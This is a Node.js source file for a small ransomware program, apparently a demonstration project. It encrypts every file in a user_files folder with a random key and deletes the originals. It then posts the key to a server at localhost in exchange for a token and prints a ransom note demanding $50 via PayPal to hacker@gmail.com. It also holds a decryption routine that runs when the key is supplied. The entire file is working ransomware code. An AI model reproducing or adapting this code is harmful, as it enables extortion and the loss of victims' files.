const fs = require('fs')
const path = require('path')
const encrypt = require('node-file-encrypt')
const fetch = require('node-fetch')
const uuid = require('uuid/v4')
const yargs = require('yargs').alias({
  'k': 'key'
})
const userFiles = "./user_files/"
const tokenPath = "./user_files/token.txt"

async function main()
{
  // Did the user pass in a key? (If so, they're trying to decrypt their files)
  const key = yargs.argv.key
  // Check to see if we already have a token (that means the user's files are already encrypted)
  const token = await getStoredToken(tokenPath)

  // If the user passed in a key, and token.txt has been generated
  if(key && token !== "")
  {
    // Try to decrypt the files
    decryptFiles(userFiles, key)
    console.log("Your files have been restored");
  }
  // Else if don't have a token and a key was not passed in, encrypt the files!!!
  else if(token === "")
  {
    // Generate a random string of characters (length 32)
    const encryptionKey = uuid()
    // Encrypt the files
    encryptFiles(userFiles, encryptionKey)
    // Send a request to the server with the encryption/decryption key and get the user's token in return
    const token = await postKey(encryptionKey)

    // Save that token to token.txt
    fs.writeFile(tokenPath, token, (err) => {
      if(err)
        throw err
    })

    // Print the ransom message
    printRansomMessage(token)
  }
  // If a key wasn't passed in and a token.txt already exists, the files are already encrypted.
  // Don't try and encrypt them again, just print the ransom message
  else
    printRansomMessage(token)
}

function printRansomMessage(token)
{
    const ransomMessage = `Your files have been encrypted! To decrypt them, send $50 Paypal to hacker@gmail.com. Include your token in a message: ${token}`
    console.log(ransomMessage);
}

function postKey(key)
{
  return new Promise((resolve, reject) => {
    fetch(`http://localhost:3000/token?key=${key}`)
      .then(res => res.text())
      .then(resolve)
  })
}

function encryptFiles(folderToEncrypt, key)
{
  fs.readdirSync(folderToEncrypt).forEach(file => {
    let fe = new encrypt.FileEncrypt(folderToEncrypt + file)
    fe.openSourceFile()
    fe.encrypt(key)
    fs.unlink(folderToEncrypt + file, () => {})
  })
  console.log('Encryption Complete');
}

function decryptFiles(folderToDecrypt, key)
{
  fs.readdirSync(folderToDecrypt).forEach(file => {
    if(file !== "token.txt")
    {
      let fe = new encrypt.FileEncrypt(folderToDecrypt + file)
      fe.openSourceFile()
      fe.decrypt(key)
      fs.unlink(folderToDecrypt + file, () => {})
    }
  })

  fs.unlinkSync(tokenPath)
  console.log('Decryption Complete');
}

function getStoredToken()
{
    return new Promise((resolve, reject) => {
      fs.readFile(tokenPath, (err, data) => {
        if(err)
          resolve("")
        else
          resolve(data)
      })
    })
}

main()
